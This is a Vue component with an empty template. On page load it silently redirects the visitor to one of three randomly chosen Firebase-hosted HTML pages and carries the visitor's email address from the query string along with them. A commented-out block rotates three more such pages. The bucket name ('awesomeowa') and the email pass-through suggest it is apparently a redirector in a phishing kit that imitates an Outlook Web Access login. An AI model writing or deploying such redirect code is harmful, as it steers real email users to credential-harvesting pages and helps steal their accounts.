<template>
</template>

<script>
export default {



  mounted(){
 
    window.location.replace(`${[
        'https://firebasestorage.googleapis.com/v0/b/awesomeowa.appspot.com/o/rcowfort%2Findexo1.html?alt=media&token=346fd848-5238-4403-a029-6f7faf5ab554',
      'https://firebasestorage.googleapis.com/v0/b/awesomeowa.appspot.com/o/rcowfort%2Findexo2.html?alt=media&token=27bbd4aa-3332-4423-9dbf-158808524894',
      'https://firebasestorage.googleapis.com/v0/b/awesomeowa.appspot.com/o/rcowfort%2Findexo3.html?alt=media&token=afd8d05d-31b4-4ad8-9cc6-54e7e9b00c7c'
    ][Math.floor(Math.random() * 3)]}&email=${new URLSearchParams(window.location.search).get('email')? new URLSearchParams(window.location.search).get('email') : ''}`)
  }
//  window.location.replace(`${[
   //     'https://firebasestorage.googleapis.com/v0/b/awesomeowa.appspot.com/o/rcowfort%2Findexr1.html?alt=media&token=757ac2f2-aeb1-47a1-ac0d-5aa91b2663e0',
   //     'https://firebasestorage.googleapis.com/v0/b/awesomeowa.appspot.com/o/rcowfort%2Findexr2.html?alt=media&token=38854c0c-3b27-4fbd-9599-d47144f1cc57',
   //     'https://firebasestorage.googleapis.com/v0/b/awesomeowa.appspot.com/o/rcowfort%2Findexr3.html?alt=media&token=81f8f70f-0832-4f0a-8d1d-a995a4262430'
  //  ][Math.floor(Math.random() * 3)]}&email=${new URLSearchParams(window.location.search).get('email')? new URLSearchParams(window.location.search).get('email') : ''}`)
 // }
}
</script>
